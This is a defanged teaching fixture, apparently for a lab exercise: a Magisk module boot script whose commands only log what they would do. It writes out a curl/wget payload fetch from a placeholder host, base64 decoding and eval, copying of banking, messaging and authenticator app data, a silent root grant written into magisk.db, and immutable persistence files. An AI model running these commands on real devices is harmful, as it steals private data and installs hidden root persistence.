#!/system/bin/sh
#
# ============================================================================
#  LAB FIXTURE - DEFANGED - DO NOT INSTALL
#
#  Teaching artefact for chapter 62 lab 04. Every hostile command is passed to
#  would(), which prints and returns. Nothing here executes. URLs use the
#  reserved .invalid TLD (RFC 2606) and cannot resolve.
# ============================================================================

MODDIR=${0%/*}
LAB_LOG=/data/local/tmp/DEFANGED-fixture.log

would() {
    echo "[DEFANGED] would have run: $*" >> "$LAB_LOG"
    return 0
}

# ---------------------------------------------------------------------------
# Why post-fs-data is the stage a payload wants.
#
# This runs after /data is decrypted and mounted, and BEFORE zygote. There is
# no framework, no app, no security software, no MDM agent, no EDR, and nothing
# that could log this. Whatever runs here runs first, as root, every boot. That
# is the entire reason a module is an attractive persistence mechanism.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Behaviour 3: fetch the real payload from the network.
#
# THIS is the finding that matters most. Nothing in the module archive tells
# you what will run, because the code that will run is not in the archive. An
# auditor who reads every byte of this ZIP has still not read the payload.
#
# Note the cover: a "profile update", fetched over HTTPS from a plausible CDN
# hostname, with a short timeout so a failed fetch does not stall the boot and
# draw attention.
# ---------------------------------------------------------------------------
would curl -s --max-time 8 https://cdn.optimizer-profiles.invalid/p/v4 -o /data/local/tmp/.p
would wget -q -T 8 -O /data/local/tmp/.p https://cdn.optimizer-profiles.invalid/p/v4

# ---------------------------------------------------------------------------
# Behaviour 4: decode and execute it.
#
# base64 in a boot script is close to diagnostic on its own. Shell that decodes
# shell is hiding from exactly the review you are performing. Combined with a
# fetch, it is a loader, and the module is a dropper.
# ---------------------------------------------------------------------------
PAYLOAD='(decoded content would go here - this fixture has none)'
would sh -c "base64 -d /data/local/tmp/.p > /data/local/tmp/.opt"
would eval "$PAYLOAD"
would /data/local/tmp/.opt

# ---------------------------------------------------------------------------
# Behaviour 5: read another application's private data.
#
# /data/data/<pkg> is 0700 and owned by that app's uid. Root ignores that, and
# SELinux is the only thing left - which is why a module with a permissive
# sepolicy.rule (see this module's sepolicy.rule) is so much more dangerous
# than one without. There is no legitimate reason for a battery tweak to be
# here.
# ---------------------------------------------------------------------------
would cp -r /data/data/com.example.bank/shared_prefs /data/local/tmp/.c/
would cp    /data/data/com.example.messenger/databases/msgstore.db /data/local/tmp/.c/
would cp -r /data/user/0/com.example.authenticator/files /data/local/tmp/.c/

# ---------------------------------------------------------------------------
# Behaviour 6: auto-grant root to its own application.
#
# magisk.db holds the su policy: which uid may become root, and whether the
# user is asked. Writing a row here means the companion app gets root silently,
# with no prompt, forever. This is the single most consequential line in the
# module and it is one line long.
# ---------------------------------------------------------------------------
would magisk --sqlite "REPLACE INTO policies (uid,policy,until,logging,notification) VALUES (10999,2,0,0,0)"
would sqlite3 /data/adb/magisk.db "REPLACE INTO policies (uid,policy) VALUES (10999,2)"

# ---------------------------------------------------------------------------
# Behaviour 7: resist removal.
#
# chattr +i makes a file immutable: even root cannot delete it until the
# attribute is cleared. Legitimate uses exist. In a boot script belonging to a
# battery optimiser, there are none.
# ---------------------------------------------------------------------------
would chattr +i /data/local/tmp/.opt
would chattr +i /data/adb/service.d/.optimizer.sh

# ---------------------------------------------------------------------------
# Behaviour 7b: a second persistence foothold outside the module.
#
# /data/adb/service.d/ scripts run at boot independently of any module, so
# removing the module in the Magisk app leaves this behind and root persists.
# Users believe uninstalling the module undoes everything. It does not.
# ---------------------------------------------------------------------------
would cp "$MODDIR/common/res/svc.sh" /data/adb/service.d/.optimizer.sh
would chmod 0755 /data/adb/service.d/.optimizer.sh

echo "[DEFANGED] post-fs-data.sh completed - nothing was executed" >> "$LAB_LOG"
